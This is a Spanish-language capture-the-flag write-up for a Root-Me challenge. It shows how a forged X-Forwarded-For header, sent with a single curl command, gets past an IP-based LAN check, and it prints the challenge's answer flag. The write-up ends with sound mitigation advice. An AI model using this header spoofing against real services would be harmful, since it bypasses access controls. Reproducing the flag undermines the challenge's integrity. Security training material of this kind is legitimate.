# Reporte de Vulnerabilidad: Bypass de Control de Acceso mediante IP Spoofing (HTTP Headers)

## 📝 Descripción
Esta vulnerabilidad ocurre cuando un servidor web confía en las cabeceras HTTP proporcionadas por el cliente para validar su identidad o ubicación geográfica/de red. Al manipular la cabecera `X-Forwarded-For`, un atacante puede suplantar una dirección IP interna (LAN) y evadir las restricciones de seguridad.

## 🔍 Detalles del Objetivo
* **Reto:** Root-Me / Web Server - HTTP IP Address Spoofing
* **Protocolo:** HTTP/1.1
* **Vector de Ataque:** Manipulación de Cabeceras (Header Manipulation)

## 🛠️ Conceptos Clave
El servidor intenta validar si la petición proviene de un espacio de direcciones privadas (**RFC 1918**). Los rangos reservados para redes privadas son:
* `10.0.0.0/8`
* `172.16.0.0/12`
* `192.168.0.0/16`



## 🚀 Pasos para la Reproducción (Exploit)

### 1. Identificación
Al acceder al recurso, el servidor deniega el acceso mostrando nuestra IP pública en formato IPv6:
`Your IP ::ffff:103.219.234.222 do not belong to the LAN.`

### 2. Inyección de Cabecera
Utilizamos `curl` para enviar una petición GET, inyectando una IP del rango privado (IANA) en la cabecera `X-Forwarded-For`.

```bash
curl -H "X-Forwarded-For: 10.0.0.1" "[http://challenge01.root-me.org/web-serveur/ch68/](http://challenge01.root-me.org/web-serveur/ch68/)"
````
3. Resultado
El servidor procesa la cabecera falsa como verdadera y permite el acceso a la Intranet, revelando el password de validación:

Flag: Ip_$po0Fing

🛡️ Mitigación y Recomendaciones

No confiar en cabeceras de usuario: Las cabeceras X-Forwarded-For, X-Real-IP, etc., son fácilmente manipulables por el cliente.

Validación en Capa de Transporte: Utilizar la dirección IP real de la conexión TCP (REMOTE_ADDR) para controles críticos de seguridad.

Configuración de Proxy Inverso: Si se utiliza un proxy (como Nginx o Cloudflare), configurar el servidor para que solo acepte cabeceras de reenvío provenientes de direcciones IP de confianza (Trusted Proxies).
